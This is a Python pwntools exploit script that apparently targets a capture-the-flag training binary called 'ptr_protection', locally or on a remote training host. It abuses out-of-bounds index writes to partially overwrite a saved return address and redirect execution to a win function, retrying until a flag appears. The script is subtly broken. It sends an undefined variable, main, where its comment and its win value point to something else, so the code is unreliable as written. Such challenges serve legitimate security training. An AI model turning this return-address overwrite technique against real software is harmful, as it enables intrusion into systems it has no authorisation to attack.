from pwn import *

cont = True

while(cont):
  if(len(sys.argv) > 1):
      if(sys.argv[1] == '-d'):
          c = process("./ptr_protection")
          gdb.attach(c, """
          brva 1524
          c
          """ )
          input("wait")
      elif(sys.argv[1] == '-r'):
          c = remote("ptr-protection.training.offensivedefensive.it", 8080, ssl=True)
  else:
      c = process("./ptr_protection")
  
  win = 0x7c
     
  c.recvuntil(b'index: ')
  c.sendline(b'40')
  c.recvuntil(b'data: ')
  c.sendline(bytes(str(main), 'utf-8')) #overwrite last two nibbles of return address with the ones of win
  c.recvuntil(b'index: ')
  c.sendline(b'41')
  c.recvuntil(b'data: ')
  c.sendline(bytes(str(0x00), 'utf-8')) 
  c.recvuntil(b'index: ')
  c.sendline(b'-1')
  print(c.recv())
   
  try:
	  flag = c.recv()
	  print(flag)
	  cont = False
  except:
	  c.close()
	  continue

